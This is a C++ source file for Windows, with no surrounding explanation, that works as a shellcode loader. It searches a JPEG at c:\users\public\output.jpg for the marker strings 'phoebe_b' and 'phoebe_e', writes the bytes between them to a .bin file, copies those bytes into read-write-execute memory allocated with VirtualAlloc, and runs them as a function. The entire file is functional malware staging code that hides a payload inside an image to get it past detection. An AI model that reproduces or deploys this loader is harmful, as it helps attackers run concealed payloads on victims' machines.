#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <Windows.h>

const std::string BEGIN_MARKER = "phoebe_b";  // Marker for the beginning of shellcode
const std::string END_MARKER = "phoebe_e";      // Marker for the end of shellcode

// Function to extract the shellcode from the JPEG file
bool ExtractShellcodeFromJPEG(const std::string& jpegPath, const std::string& outputShellcodePath) {
    // Read the JPEG file with embedded shellcode
    std::ifstream jpegFile(jpegPath, std::ios::binary);
    if (!jpegFile) {
        std::cerr << "Failed to open JPEG file!" << std::endl;
        return false;
    }
    std::vector<unsigned char> jpegData((std::istreambuf_iterator<char>(jpegFile)), std::istreambuf_iterator<char>());
    jpegFile.close();

    // Find the markers
    auto beginPos = std::search(jpegData.begin(), jpegData.end(), BEGIN_MARKER.begin(), BEGIN_MARKER.end());
    auto endPos = std::search(jpegData.begin(), jpegData.end(), END_MARKER.begin(), END_MARKER.end());

    if (beginPos == jpegData.end() || endPos == jpegData.end()) {
        std::cerr << "Markers not found in the JPEG file!" << std::endl;
        return false;
    }

    // Extract the shellcode between the markers
    beginPos += BEGIN_MARKER.size();  // Move past the BEGIN_MARKER
    std::vector<unsigned char> shellcodeData(beginPos, endPos);

    // Write the extracted shellcode to a file
    std::ofstream outputFile(outputShellcodePath, std::ios::binary);
    if (!outputFile) {
        std::cerr << "Failed to open output shellcode file!" << std::endl;
        return false;
    }
    outputFile.write(reinterpret_cast<const char*>(shellcodeData.data()), shellcodeData.size());
    outputFile.close();

    std::cout << "Shellcode extracted successfully!" << std::endl;
    return true;
}

int main() {
    std::string outputFilePath = "c:\\users\\public\\output.jpg";      // Path for the output JPEG with embedded shellcode
    std::string extractedShellcodePath = "c:\\users\\public\\extracted_shellcode.bin";  // Path for the extracted shellcode

   
    // Extract shellcode from the JPEG
    if (!ExtractShellcodeFromJPEG(outputFilePath, extractedShellcodePath)) {
        return 1;
    }

    // Open the .bin file
    std::ifstream file("c:\\users\\public\\extracted_shellcode.bin", std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open file!" << std::endl;
        return -1;
    }

    // Get the file size
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Allocate memory for the contents of the file
    char* buffer = new char[size];

    // Read the file into the buffer
    if (file.read(buffer, size)) {
        // Allocate executable memory and copy the content there
        void* execMemory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (execMemory == NULL) {
            std::cerr << "Memory allocation failed!" << std::endl;
            delete[] buffer;
            return -1;
        }

        // Copy the binary content to the allocated memory
        memcpy(execMemory, buffer, size);

        // Cast the memory to a function pointer and execute
        typedef void(*Function)();
        Function func = reinterpret_cast<Function>(execMemory);
        func();  // Call the function (execute the binary content)

        // Free memory and resources
        VirtualFree(execMemory, 0, MEM_RELEASE);
    }
    else {
        std::cerr << "Failed to read file!" << std::endl;
        delete[] buffer;
        return -1;
    }

    // Cleanup
    delete[] buffer;

    return 0;
}
